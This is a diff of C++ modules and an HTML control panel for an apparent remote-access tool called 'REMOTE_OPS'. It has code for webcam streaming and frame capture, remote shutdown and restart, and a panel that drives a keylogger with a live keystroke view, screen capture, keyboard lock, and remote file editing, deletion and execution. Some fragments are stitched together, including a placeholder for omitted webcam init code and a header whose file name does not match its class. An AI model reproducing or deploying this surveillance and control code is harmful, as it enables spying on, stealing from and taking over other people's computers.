+        SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER
+    );
+
+    DWORD gle = res ? 0 : GetLastError();
+    CloseHandle(hToken);
+
+    if (!res) {
+        return {
+            {"status","error"},
+            {"module", get_module_name()},
+            {"message","ExitWindowsEx failed"},
+            {"last_error", static_cast<int>(gle)}
+        };
+    }
+
+    return {
+        {"status","success"},
+        {"module", get_module_name()},
+        {"command","RESTART"},
+        {"message","System is restarting"}
+    };
+}
+
+// DISPATCHER
+
+json SystemManager::handle_command(const json& request) {
+    const std::string command = request.value("command", "");
+
+    if (command == "SHUTDOWN") {
+        return shutdown_system();
+    }
+    if (command == "RESTART") {
+        return restart_system();
+    }
+    
+    return {
+        {"status","error"},
+        {"module", get_module_name()},
+        {"message","Unknown SYSTEM command"},
+        {"received_command", command}
+    };
+}
+
+--
+// src/modules/ProcessManager.hpp
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <string>
+
+#if _WIN32
+#include <windows.h> // Cho các kiểu dữ liệu Windows
+#else
+#include <thread>
+#include <iostream>
+#endif
+
+class SystemManager : public IRemoteModule {
+private:
+    std::string module_name_ = "SYSTEM";
+    
+    // Các hàm thực thi Windows API (Triển khai trong .cpp)
+    json shutdown_system() const;
+    json restart_system() const;
+    
+public:
+    SystemManager() = default;
+    const std::string& get_module_name() const override { return module_name_; }
+    json handle_command(const json& request) override; // Định nghĩa trong .cpp
+};
+
+--
+#include "WebcamManager.hpp"
+#include <iostream>
+#include <cstdio>
+#include <vector>
+#include <algorithm> // std::search
+#include <cstring>   // strerror
+#include <cstdint>   // [FIX] Cần cho uint8_t
+
+void WebcamManager::stop_stream() {
+    running_ = false;
+    if (stream_thread_.joinable()) {
+        stream_thread_.join();
+    }
+}
+
+void WebcamManager::start_stream(StreamCallback callback) {
+    stop_stream();
+    running_ = true;
+
+    // VIẾT LOGIC FFMPEG TRONG LAMBDA (GIỐNG WINDOWS)
+    stream_thread_ = std::thread([this, callback]() {
+        const char* cmd = "ffmpeg -f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0 -f image2pipe -vcodec mjpeg -q:v 10 pipe:1 2>/dev/null";
+        FILE* pipe = popen(cmd, "r");
+        
+        if (!pipe) return;
+
+        std::vector<uint8_t> buffer;
+        std::vector<uint8_t> read_chunk(4096);
+        const std::vector<uint8_t> jpeg_start = {0xFF, 0xD8};
+        const std::vector<uint8_t> jpeg_end   = {0xFF, 0xD9};
+
+        while (running_) {
+            size_t bytes_read = fread(read_chunk.data(), 1, read_chunk.size(), pipe);
+            if (bytes_read <= 0) break;
+
+            buffer.insert(buffer.end(), read_chunk.begin(), read_chunk.begin() + bytes_read);
+
+            while (true) {
+                auto start_it = std::search(buffer.begin(), buffer.end(), jpeg_start.begin(), jpeg_start.end());
+                if (start_it == buffer.end()) {
+                    if (buffer.size() > 65536) buffer.clear();
+                    break;
+                }
+
+                auto end_it = std::search(start_it, buffer.end(), jpeg_end.begin(), jpeg_end.end());
+                if (end_it == buffer.end()) break;
+
+                if (end_it + 2 > buffer.end()) break; // Safety check
+
+                std::vector<uint8_t> jpg_frame(start_it, end_it + 2);
+                
+                // Gọi callback trực tiếp (không cần biến thành viên callback_)
+                callback(jpg_frame);
+
+                buffer.erase(buffer.begin(), end_it + 2);
+            }
+        }
+        pclose(pipe);
+    });
+}
+
+
+--
+#include "WebcamManager.hpp"
+#include <fstream>
+#include <ctime>
+#include <iomanip>
+#include <sstream>
+#include <direct.h> // _mkdir
+#include <chrono>   // Để đo thời gian lưu file
+
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "mf.lib")
+#pragma comment(lib, "mfplat.lib")
+#pragma comment(lib, "mfreadwrite.lib")
+#pragma comment(lib, "mfuuid.lib")
+
+using namespace Gdiplus;
+
+// --- HELPER: GDI+ Encoder (Static) ---
+static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+UINT  num = 0; UINT  size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    auto pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return -1;
+}
+
+// --- HELPER: GDI+ Init ---
+struct GdiPlusInitWebcam {
+    ULONG_PTR gdiplusToken;
+    GdiPlusInitWebcam() { GdiplusStartupInput g; GdiplusStartup(&gdiplusToken, &g, NULL); }
+    ~GdiPlusInitWebcam() { GdiplusShutdown(gdiplusToken); }
+};
+static GdiPlusInitWebcam init;
+
+static void SaveWebcamFrame(const std::vector<uint8_t>& data) {
+    _mkdir("captured_data");
+    
+    auto t = std::time(nullptr);
+    auto tm = *std::localtime(&t);
+    
+    std::ostringstream oss;
+    oss << "captured_data/cam_" << std::put_time(&tm, "%Y%m%d_%H%M%S") << ".jpg";
+    std::string filename = oss.str();
+
+    std::ofstream file(filename, std::ios::binary);
+    if (file.is_open()) {
+        file.write(reinterpret_cast<const char*>(data.data()), data.size());
+        file.close();
+        std::cout << "[WEBCAM] Saved snapshot: " << filename << std::endl;
+    }
+}
+
+void WebcamManager::stop_stream() {
+    running_ = false;
+    if (stream_thread_.joinable()) stream_thread_.join();
+}
+
+void WebcamManager::start_stream(StreamCallback callback) {
+    stop_stream(); 
+    running_ = true;
+
+    stream_thread_ = std::thread([this, callback]() {
+        HRESULT hr = S_OK;
+        hr = MFStartup(MF_VERSION);
+        if (FAILED(hr)) return;
+
+        // ... (Giữ nguyên phần khởi tạo MFCreateAttributes, tìm thiết bị, tạo Reader như cũ) ...
+        // ... (Để tiết kiệm không gian hiển thị, tôi không paste lại đoạn init dài dòng đó, 
+        //      bạn hãy giữ nguyên đoạn code từ dòng 55 đến dòng 110 trong file gốc của bạn) ...
+        
+        // (Đây là đoạn code giả lập phần init webcam bạn đang có - HÃY GIỮ NGUYÊN CODE CŨ CỦA BẠN ĐẾN TRƯỚC VÒNG LẶP WHILE)
+        IMFAttributes* pAttributes = NULL; IMFActivate** ppDevices = NULL; UINT32 count = 0;
+        IMFMediaSource* pSource = NULL; IMFSourceReader* pReader = NULL;
+        MFCreateAttributes(&pAttributes, 1);
+        pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
+        MFEnumDeviceSources(pAttributes, &ppDevices, &count);
+        if (count > 0) ppDevices[0]->ActivateObject(IID_PPV_ARGS(&pSource));
+        pAttributes->Release(); for(UINT32 i=0; i<count; i++) ppDevices[i]->Release(); CoTaskMemFree(ppDevices);
+        if (!pSource) return;
+
+        IMFAttributes* pReaderAttributes = NULL;
+        MFCreateAttributes(&pReaderAttributes, 1);
+        pReaderAttributes->SetUINT32(MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE);
+        MFCreateSourceReaderFromMediaSource(pSource, pReaderAttributes, &pReader);
+        if(pReaderAttributes) pReaderAttributes->Release();
+
+        IMFMediaType* pType = NULL; MFCreateMediaType(&pType);
+        pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
+        pType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB32);
+        pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
+        pType->Release();
+        // (Kết thúc phần init giả lập)
+
+        CLSID jpgClsid;
+        GetEncoderClsid(L"image/jpeg", &jpgClsid);
+        EncoderParameters encoderParameters;
+        encoderParameters.Count = 1;
+        encoderParameters.Parameter[0].Guid = EncoderQuality;
+        encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
+        encoderParameters.Parameter[0].NumberOfValues = 1;
+        ULONG quality = 50; 
+        encoderParameters.Parameter[0].Value = &quality;
+
+        std::cout << "[WEBCAM] Streaming started...\n";
+
+        // [MỚI] BIẾN ĐẾM THỜI GIAN ĐỂ LƯU FILE
+        auto last_save_time = std::chrono::steady_clock::now();
+
+        while (running_) {
+            IMFSample* pSample = NULL;
+            DWORD streamIndex, flags;
+            LONGLONG llTimeStamp;
+
+            hr = pReader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0, &streamIndex, &flags, &llTimeStamp, &pSample);
+            if (FAILED(hr)) break;
+
+            if (pSample) {
+                IMFMediaBuffer* pBuffer = NULL;
+                pSample->ConvertToContiguousBuffer(&pBuffer);
+                
+                BYTE* pBitmapData = NULL;
+                DWORD maxLength = 0, currentLength = 0;
+                
+                if (SUCCEEDED(pBuffer->Lock(&pBitmapData, &maxLength, &currentLength))) {
+                    IMFMediaType* pCurrentType = NULL;
+                    pReader->GetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurrentType);
+                    UINT32 width = 0, height = 0;
+                    MFGetAttributeSize(pCurrentType, MF_MT_FRAME_SIZE, &width, &height);
+                    
+                    Bitmap bmp(width, height, width * 4, PixelFormat32bppRGB, pBitmapData);
+                    IStream* pStream = NULL;
+                    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
+                        if (bmp.Save(pStream, &jpgClsid, &encoderParameters) == Ok) {
+                            STATSTG stg;
+                            pStream->Stat(&stg, STATFLAG_NONAME);
+                            ULONG sz = stg.cbSize.LowPart;
+                            std::vector<uint8_t> jpgData(sz);
+                            LARGE_INTEGER seekPos = {0};
+                            pStream->Seek(seekPos, STREAM_SEEK_SET, NULL);
+                            ULONG bytesRead;
+                            pStream->Read(jpgData.data(), sz, &bytesRead);
+
+                            // 1. Gửi về Client (như cũ)
+                            if (callback) callback(jpgData);
+
+                            // 2. [MỚI] Kiểm tra thời gian để lưu file (Mỗi 5 giây lưu 1 lần)
+                            auto now = std::chrono::steady_clock::now();
+                            if (std::chrono::duration_cast<std::chrono::seconds>(now - last_save_time).count() >= 5) {
+                                // SaveWebcamFrame(jpgData);
+                                last_save_time = now; // Cập nhật thời gian lưu cuối cùng
+                            }
+                        }
+                        pStream->Release();
+                    }
+                    pCurrentType->Release();
+                    pBuffer->Unlock();
+                }
+                pBuffer->Release();
+                pSample->Release();
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(40));
+        }
+
+        if(pSource) pSource->Release();
+        if(pReader) pReader->Release();
+        MFShutdown();
+    });
+}
+--
+#pragma once
+#include "../interfaces/IRemoteModule.hpp"
+#include <functional>
+#include <atomic>
+#include <vector>
+#include <thread>
+#include <iostream>
+#include <vector>
+
+#if _WIN32
+#include <windows.h>
+#include <objidl.h> 
+#include <gdiplus.h>
+#include <mfapi.h>
+#include <mfidl.h>
+#include <mfreadwrite.h>
+#else
+#endif
+
+class WebcamManager : public IRemoteModule {
+public:
+    using StreamCallback = std::function<void(const std::vector<uint8_t>&)>;
+
+    const std::string& get_module_name() const override {
+        static const std::string name = "WEBCAM";
+        return name;
+    }
+
+    // Hàm xử lý lệnh JSON (Start/Stop từ client)
+    json handle_command(const json& request) override {
+        // Chúng ta xử lý logic stream ở Main thông qua hàm start_stream bên dưới
+        // Hàm này chỉ để giữ đúng interface
+        return {{"status", "ok"}}; 
+    }
+
+    // Hàm bắt đầu luồng video
+    void start_stream(StreamCallback callback);
+    
+    // Hàm dừng luồng
+    void stop_stream();
+
+private:
+    std::atomic<bool> running_{false};
+    std::thread stream_thread_;
+};
+
+--
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>REMOTE_OPS // V12_SMART_EXPLORER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        /* --- CORE CSS --- */
+        :root { --bg-color: #050505; --panel-bg: rgba(10, 20, 10, 0.95); --main-color: #00ff41; --accent-color: #00f7ff; --alert-color: #ff3333; --border: 1px solid #333; }
+        * { box-sizing: border-box; }
+        body { font-family: 'Share Tech Mono', monospace; background-color: var(--bg-color); color: var(--main-color); margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .header { padding: 10px 20px; border-bottom: 2px solid var(--main-color); background: #001100; display: flex; justify-content: space-between; align-items: center; }
+        .brand { font-size: 20px; font-weight: bold; } input, button, textarea { font-family: 'Share Tech Mono'; padding: 6px 10px; background: #000; color: var(--main-color); border: 1px solid var(--main-color); outline: none; }
+        button:hover { background: var(--main-color); color: #000; cursor: pointer; }
+        .btn-red { border-color: var(--alert-color); color: var(--alert-color); }
+        .btn-red:hover { background: var(--alert-color); color: #fff; }
+
+        .main-grid { display: grid; grid-template-columns: 280px 1fr; height: calc(100vh - 50px); }
+        .panel { background: var(--panel-bg); border: var(--border); padding: 10px; display: flex; flex-direction: column; overflow: hidden; }
+
+        /* TABS */
+        .tab-bar { display: flex; gap: 5px; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 5px; }
+        .tab-btn { flex: 1; border: none; background: #111; color: #555; font-size: 11px; }
+        .tab-btn.active { background: var(--main-color); color: #000; }
+
+        /* EXPLORER */
+        .address-bar { display: flex; background: #111; border-bottom: 1px solid #333; padding: 8px; gap: 5px; align-items: center; }
+        .crumb { cursor: pointer; color: #aaa; } .crumb:hover { color: #fff; text-decoration: underline; }
+        
+        .file-grid { flex-grow: 1; overflow-y: auto; padding: 10px; display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; align-content: start; }
+        .file-item { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 10px; border: 1px solid transparent; border-radius: 5px; cursor: pointer; }
+        .file-item:hover { background: #112211; border-color: #004400; }
+        .file-icon { font-size: 32px; margin-bottom: 5px; }
+        .file-name { font-size: 11px; word-break: break-all; color: #ccc; }
+
+        /* CONTEXT MENU */
+        #context-menu { position: absolute; display: none; background: #111; border: 1px solid var(--main-color); z-index: 100; min-width: 140px; }
+        .ctx-item { padding: 8px 12px; cursor: pointer; font-size: 12px; border-bottom: 1px solid #222; }
+        .ctx-item:hover { background: var(--main-color); color: #000; }
+
+        /* EDITOR MODAL */
+        .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 200; display: none; align-items: center; justify-content: center; }
+        .modal-content { width: 85%; height: 85%; background: #000; border: 1px solid var(--main-color); display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        .modal-header { padding: 10px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+        #editor-text { flex-grow: 1; background: #0c0c0c; color: #e0e0e0; border: none; padding: 15px; font-family: 'Fira Code', monospace; resize: none; outline: none; font-size: 13px; line-height: 1.5; }
+
+        /* LIST & PREVIEW */
+        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid #333; }
+        .file-item-list { padding: 8px; border-bottom: 1px solid #222; cursor: pointer; display: flex; justify-content: space-between; font-size: 11px; }
+        .preview-area { 
+    flex-grow: 1; 
+    display: flex; 
+    flex-direction: column; 
+    align-items: center; 
+    justify-content: center; 
+    background: #000; 
+    border: 1px solid #333; 
+    position: relative; 
+    overflow: hidden; /* Cắt phần thừa nếu có */
+}
+
+/* QUAN TRỌNG: Đảm bảo ảnh giữ đúng tỷ lệ và không bị méo */
+.preview-area img { 
+    max-width: 100%; 
+    max-height: 100%; 
+    width: auto;      /* Để tự động theo tỷ lệ gốc */
+    height: auto;     /* Để tự động theo tỷ lệ gốc */
+    object-fit: contain; /* Hiển thị toàn bộ ảnh */
+    cursor: crosshair;   /* Đổi con trỏ chuột cho dễ nhìn */
+}
+        
+        .hidden { display: none !important; }
+        .key-box { width: 100%; height: 100px; background: #0a0a0a; border: 1px solid #333; color: #0f0; font-size: 12px; resize: none; margin-top: 5px; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="brand">REMOTE<span>OPS</span></div>
+        <div>
+            <input type="text" id="ip" value="ws://localhost:9010">
+            <button onclick="connect()">CONNECT</button>
+        </div>
+    </div>
+
+    <div class="main-grid">
+        <div class="panel">
+            <div class="tab-bar">
+                <button class="tab-btn active" onclick="switchTab('control')">CONTROLS</button>
+                <button class="tab-btn" onclick="switchTab('explorer')">EXPLORER</button>
+                <button class="tab-btn" onclick="switchTab('gallery')">GALLERY</button>
+            </div>
+
+            <div id="tab-control" style="display:flex; flex-direction:column; height:100%; overflow-y: auto;">
+                <button onclick="send('PROCESS','LIST')" style="margin-bottom:5px;">REFRESH PROCESS</button>
+                <button onclick="send('APP','LIST')" style="margin-bottom:5px;">REFRESH APPS</button>
+                <div style="border-top:1px dashed #333; margin:10px 0;"></div>
+                <button onclick="takeScreenshot()">📷 CAPTURE SCREEN</button>
+                <button onclick="startWebcam()" style="margin-top:5px;">⏺ REC WEBCAM</button>
+                <button onclick="stopWebcam()" style="margin-top:5px;" class="btn-red">■ STOP & SAVE</button>
+                <button id="btn-remote" onclick="toggleRemote()">🎮 REMOTE CONTROL</button>
+                <div style="border-top:1px dashed #333; margin:10px 0; padding-top:10px;">
+                    <div style="font-size:12px; color:#aaa; margin-bottom:5px;">KEYLOGGER</div>
+                    <div style="display:flex; gap:5px;">
+                        <button onclick="send('KEYBOARD','START')" style="flex:1">▶ REC</button>
+                        <button onclick="send('KEYBOARD','STOP')" class="btn-red" style="flex:1">■ STOP</button>
+                    </div>
+                    <textarea id="key-stream" class="key-box" readonly placeholder="> Keystrokes..."></textarea>
+                    
+                    <div style="font-size:12px; color:#aaa; margin-top:10px; margin-bottom: 5px;">SECURITY</div>
+                    <div style="display:flex; gap:5px;">
+                        <button class="btn-red" onclick="send('KEYBOARD','LOCK')" style="flex:1">🔒 LOCK</button>
+                        <button onclick="send('KEYBOARD','UNLOCK')" style="flex:1">🔓 UNLOCK</button>
+                    </div>
+                </div>
+            </div>
+
+            <div id="tab-explorer" class="hidden" style="display:flex; flex-direction:column; height:100%;">
+                <div style="padding:10px; color:#aaa; font-size:11px; text-align:center;">
+                    Files are shown in the main panel ->
+                </div>
+                <button onclick="send('FILE','LIST_DIR',{path:''})">💻 MY COMPUTER</button>
+                <button onclick="refresh()" style="margin-top:5px;">↻ REFRESH DIR</button>
+            </div>
+
+            <div id="tab-gallery" class="hidden" style="display:flex; flex-direction:column; height:100%;">
+                <button onclick="send('FILE','LIST')" style="margin-bottom: 5px;">↻ RELOAD LIST</button>
+                <div class="file-list" id="file-list-box">
+                    <div style="padding:10px; color:#666; text-align:center;">Empty</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div id="explorer-view" class="hidden" style="height:100%; display:flex; flex-direction:column;">
+                <div class="address-bar" id="breadcrumbs"><span>Not Connected</span></div>
+                <div class="file-grid" id="file-grid"></div>
+            </div>
+
+            <div id="media-view" class="preview-area">
+                <div style="position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.7); padding:2px 5px; color:#aaa; font-size:11px;" id="view-label">WAITING...</div>
+                <img id="main-view" alt="">
+                <video id="video-player" controls class="hidden"></video>
+            </div>
+
+            <div id="log-area" style="height:60px; background:#000; border-top:1px solid #333; font-size:11px; color:#0f0; overflow-y:auto;"></div>
+        </div>
+    </div>
+
+    <div id="context-menu">
+        <div class="ctx-item" onclick="ctxSmartOpen()">🚀 Open / Edit</div>
+        <div class="ctx-item" onclick="ctxDownload()">⬇ Download</div>
+        <div class="ctx-item" onclick="ctxDelete()" style="color:var(--alert-color)">❌ Delete</div>
+    </div>
+
+    <div id="editor-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span id="editor-title" style="color:#00ff41; font-weight:bold;">Editing...</span>
+                <div>
+                    <button onclick="saveFile()" style="border-color:#00ff41; color:#00ff41;">💾 SAVE & CLOSE</button>
+                    <button class="btn-red" onclick="closeEditor()">CANCEL</button>
+                </div>
+            </div>
+            <textarea id="editor-text"></textarea>
+        </div>
+    </div>
+
+    <canvas id="record-canvas" style="display:none;"></canvas>
+
+<script>
+    let ws = null;
+    let currentPath = "";
+    let selectedFile = null;
+    let mediaRecorder = null, recordedChunks = [], isRecording = false;
+    const canvas = document.getElementById('record-canvas');
+    const ctx = canvas.getContext('2d');
+
+    // --- UTILS: DETECT FILE TYPE ---
+    function isTextFile(filename) {
+        const exts = ['.txt', '.cpp', '.h', '.hpp', '.c', '.js', '.html', '.css', '.json', '.xml', '.log', '.ini', '.bat', '.cmd', '.py'];
+        return exts.some(ext => filename.toLowerCase().endsWith(ext));
+    }
+
+    // --- CONNECTION ---
+    function connect() {
+        ws = new WebSocket(document.getElementById('ip').value);
+        ws.binaryType = "arraybuffer";
+        ws.onopen = () => { log("Connected"); send('FILE','LIST_DIR',{path:''}); };
+        ws.onmessage = handleMessage;
+    }
+    function send(mod, cmd, payload={}) { if(ws) ws.send(JSON.stringify({module:mod, command:cmd, payload:payload})); }
+
+    // --- MESSAGE HANDLER ---
+    function handleMessage(evt) {
+        if (evt.data instanceof ArrayBuffer) {
+            // Binary Handling (Image/Video/Download)
+            const blob = new Blob([evt.data]);
+            // Nếu đang trong modal editor hoặc context menu download -> Tải về
+            if (selectedFile && selectedFile.downloading) {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a'); a.href = url; a.download = selectedFile.name; a.click();
+                selectedFile.downloading = false;
+                log("File downloaded: " + selectedFile.name);
+            } else {
+                // Mặc định là Stream ảnh/video
+                const url = URL.createObjectURL(blob);
+                const imgView = document.getElementById('main-view');
+                imgView.src = url;
+                if(isRecording) {
+                    const img = new Image(); img.onload = () => {
+                        if (canvas.width !== img.width) { canvas.width = img.width; canvas.height = img.height; }
+                        ctx.drawImage(img, 0, 0);
+                    }; img.src = url;
+                }
+            }
+        } else {
+            try { handleJson(JSON.parse(evt.data)); } catch(e){}
+        }
+    }
+
+    function handleJson(res) {
+        if (res.command === 'LIST_DIR') renderExplorer(res);
+        else if (res.command === 'READ_TEXT') openEditor(res);
+        else if (res.command === 'WRITE_TEXT') {
+            // [QUAN TRỌNG] LƯU XONG TỰ ĐÓNG
+            if (res.status === 'success') {
+                alert("File Saved Successfully!");
+                closeEditor(); // Đóng modal
+                refresh();     // Refresh lại list file
+            } else {
+                alert("Error saving file: " + res.message);
+            }
+        }
+        else if (res.command === 'EXECUTE') {
+            alert(res.status === 'success' ? "Executed on Server!" : "Execution Failed: " + res.message);
+        }
+        else if (res.command === 'DELETE' && res.status === 'success') refresh();
+        else if (res.command === 'SAVE_VIDEO') { log("Video Saved!"); send('FILE','LIST'); switchTab('gallery'); }
+        else if (res.module === 'KEYBOARD') {
+            document.getElementById('key-stream').value += res.data.key;
+        }
+        else if (res.module === 'FILE' && res.command === 'LIST') renderGallery(res.data);
+    }
+
+    // --- EXPLORER LOGIC ---
+    function renderExplorer(res) {
+        currentPath = res.current_path;
+        renderBreadcrumbs(currentPath);
+        const grid = document.getElementById('file-grid');
+        grid.innerHTML = "";
+        
+        // Sort: Drive -> Dir -> File
+        const list = res.data.sort((a,b) => (a.type==='drive'?0:a.type==='dir'?1:2) - (b.type==='drive'?0:b.type==='dir'?1:2));
+
+        list.forEach(f => {
+            const el = document.createElement('div');
+            el.className = 'file-item';
+            let icon = f.type==='drive'?'💽': f.type==='dir'?'📁': f.type==='image'?'🖼️': '📄';
+            el.innerHTML = `<div class="file-icon">${icon}</div><div class="file-name">${f.name}</div>`;
+            
+            // CLICK LOGIC
+            el.onclick = () => {
+                if(f.type === 'dir' || f.type === 'drive') send('FILE','LIST_DIR',{path: f.path});
+                else {
+                    selectedFile = f;
+                    ctxSmartOpen(); // Gọi hàm mở thông minh
+                }
+            };
+            // CONTEXT MENU
+            el.oncontextmenu = (e) => {
+                e.preventDefault();
+                selectedFile = f;
+                showContextMenu(e.clientX, e.clientY, f.type);
+            };
+            grid.appendChild(el);
+        });
+    }
+
+    function ctxSmartOpen() {
+        if (!selectedFile) return;
+        document.getElementById('context-menu').style.display = 'none';
+
+        // [QUAN TRỌNG] KIỂM TRA ĐUÔI FILE
+        if (isTextFile(selectedFile.name)) {
+            // Nếu là file code -> Gửi lệnh ĐỌC để sửa
+            log("Opening editor for: " + selectedFile.name);
+            send('FILE', 'READ_TEXT', {path: selectedFile.path});
+        } else {
+            // Nếu là exe, ảnh, nhạc -> Gửi lệnh CHẠY
+            if(confirm("Execute/Run " + selectedFile.name + " on Server?")) {
+                send('FILE', 'EXECUTE', {path: selectedFile.path});
+            }
+        }
+    }
+
+    function openEditor(res) {
+        document.getElementById('editor-modal').style.display = 'flex';
+        document.getElementById('editor-text').value = res.content;
+        document.getElementById('editor-title').innerText = "EDIT: " + res.path;
+        // Lưu path vào selectedFile để dùng khi save
+        selectedFile = { path: res.path, name: res.path.split(/[\\/]/).pop() }; 
+    }
+
+    function saveFile() {
+        const content = document.getElementById('editor-text').value;
+        send('FILE', 'WRITE_TEXT', { path: selectedFile.path, content: content });
+    }
+
+    function closeEditor() { document.getElementById('editor-modal').style.display = 'none'; }
+
+    // --- OTHER UI FUNCTIONS ---
+    function renderBreadcrumbs(path) {
+        const bar = document.getElementById('breadcrumbs');
+        if(!path) { bar.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">MY COMPUTER</span>"; return; }
+        const parts = path.split(/[\\/]/).filter(p => p.length > 0);
+        bar.innerHTML = "<span class='crumb' onclick=\"send('FILE','LIST_DIR',{path:''})\">PC</span> > ";
+        let built = "";
+        parts.forEach((p,i) => {
+            built += (i===0 && p.includes(':') ? p+"\\" : (i===0?p:"\\"+p));
+            bar.innerHTML += `<span class='crumb' onclick="send('FILE','LIST_DIR',{path:'${built.replace(/\\/g,'\\\\')}'})">${p}</span>` + (i<parts.length-1?" > ":"");
+        });
+    }
+
+    function showContextMenu(x, y) {
+        const menu = document.getElementById('context-menu');
+        menu.style.display = 'block'; menu.style.left = x+'px'; menu.style.top = y+'px';
+    }
+    document.addEventListener('click', () => document.getElementById('context-menu').style.display = 'none');
+
+    function ctxDownload() {
+        if(!selectedFile) return;
+        selectedFile.downloading = true; // Đánh dấu để handleMessage biết
+        send('FILE', 'GET', {name: selectedFile.path});
+    }
+    function ctxDelete() {
+        if(selectedFile && confirm("Delete "+selectedFile.name+"?")) send('FILE','DELETE',{path:selectedFile.path});
+    }
+
+    function switchTab(tab) {
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelector(`button[onclick="switchTab('${tab}')"]`).classList.add('active');
+        
+        const views = {
+            'control': ['tab-control', 'media-view'],
+            'explorer': ['tab-explorer', 'explorer-view'],
+            'gallery': ['tab-gallery', 'media-view']
+        };
+
+        // Hide all
+        ['tab-control','tab-explorer','tab-gallery'].forEach(id => document.getElementById(id).classList.add('hidden'));
+        ['media-view','explorer-view'].forEach(id => document.getElementById(id).classList.add('hidden'));
+
+        // Show selected
+        document.getElementById(views[tab][0]).classList.remove('hidden');
+        document.getElementById(views[tab][1]).classList.remove('hidden');
+
+        if(tab==='explorer') send('FILE','LIST_DIR',{path: currentPath});
+        if(tab==='gallery') send('FILE','LIST');
+        
+        // Reset player if moving away from gallery
+        if(tab!=='gallery') { 
+            const vp=document.getElementById('video-player'); vp.pause(); vp.classList.add('hidden'); 
+            document.getElementById('main-view').classList.remove('hidden');
+        }
+    }
+
+    // --- MEDIA & REC FUNCTIONS ---
+    function renderGallery(data) {
+        const list = document.getElementById('file-list-box'); list.innerHTML = "";
+        data.reverse().forEach(f => {
+            const div = document.createElement('div'); div.className = 'file-item-list';
+            div.innerHTML = `<span>${f.name}</span> <span style="color:#666">${(f.size/1024).toFixed(1)} KB</span>`;
+            div.onclick = () => {
+                document.getElementById('main-view').classList.add('hidden');
+                document.getElementById('video-player').classList.add('hidden');
+                if(f.name.endsWith('.webm')) {
+                    const vp = document.getElementById('video-player'); vp.classList.remove('hidden');
+                    ws.onmessage = (e) => { vp.src = URL.createObjectURL(new Blob([e.data],{type:'video/webm'})); vp.play(); ws.onmessage = handleMessage; };
+                } else {
+                    document.getElementById('main-view').classList.remove('hidden');
+                    ws.onmessage = (e) => { document.getElementById('main-view').src = URL.createObjectURL(new Blob([e.data],{type:'image/jpeg'})); ws.onmessage = handleMessage; };
+                }
+                send('FILE','GET',{name:f.name});
+            };
+            list.appendChild(div);
+        });
+    }
+
+    function startWebcam() { send('WEBCAM','START_STREAM'); isRecording=true; recordedChunks=[]; mediaRecorder = new MediaRecorder(canvas.captureStream(25)); mediaRecorder.ondataavailable=e=>{if(e.data.size>0)recordedChunks.push(e.data)}; mediaRecorder.onstop=uploadVideo; mediaRecorder.start(); document.getElementById('view-label').innerText="REC..."; }
+    function stopWebcam() { send('WEBCAM','STOP_STREAM'); if(isRecording) { mediaRecorder.stop(); isRecording=false; } }
+    function uploadVideo() { const r=new FileReader(); r.readAsDataURL(new Blob(recordedChunks,{type:'video/webm'})); r.onloadend=()=>{ send('FILE','SAVE_VIDEO',{name:`rec_${new Date().getTime()}.webm`, data:r.result.split(',')[1]}); }; }
+    function takeScreenshot() { 
+        switchTab('control'); 
+        // Thêm payload {save: true} (hoặc không cần vì mặc định là true)
+        send('SCREEN', 'CAPTURE_BINARY', { save: true }); 
+    }
+    function refresh() { send('FILE','LIST_DIR',{path: currentPath}); }
+    function log(m) { document.getElementById('log-area').innerText += `> ${m}\n`; }
+    let isRemoteControl = false;
+let lastMove = 0;
+
+// --- HÀM BẬT/TẮT ĐIỀU KHIỂN ---
+function toggleRemote() {
+    isRemoteControl = !isRemoteControl;
+    const btn = document.getElementById('btn-remote'); // Bạn cần thêm nút này vào HTML
+    const img = document.getElementById('main-view');
+    
+    if (isRemoteControl) {
